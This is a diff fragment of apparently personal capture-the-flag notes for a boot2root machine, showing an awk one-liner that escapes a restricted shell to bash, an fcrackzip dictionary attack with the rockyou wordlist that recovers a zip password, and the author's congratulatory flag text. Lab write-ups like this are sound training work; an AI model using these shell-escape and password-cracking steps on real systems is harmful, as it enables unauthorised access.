@@ -104,3 +104,25 @@ awk  cat  cd  clear  echo  exit  help  history  ll  lpath  ls  lsudo  vim
 $  awk 'BEGIN{system("/bin/bash")}'
 
 
+
+
+
+############
+fcrackzip flag.zip -D -p /usr/share/wordlists/rockyou.txt -u
+PASSWORD FOUND!!!!: pw == ilovepeach
+#############################################3
+
+cat flag.txt 
+Well done :D If you reached this it means you got root, congratulations.
+Now, there are multiple ways to hack this machine. The goal is to get all the passwords of all the users in this machine. If you did it, then congratulations, I hope you had fun :D
+
+Keep in touch on twitter through @mr_h4sh
+
+Congratulations again!
+								
+mr_h4sh
+
+
+
+
+
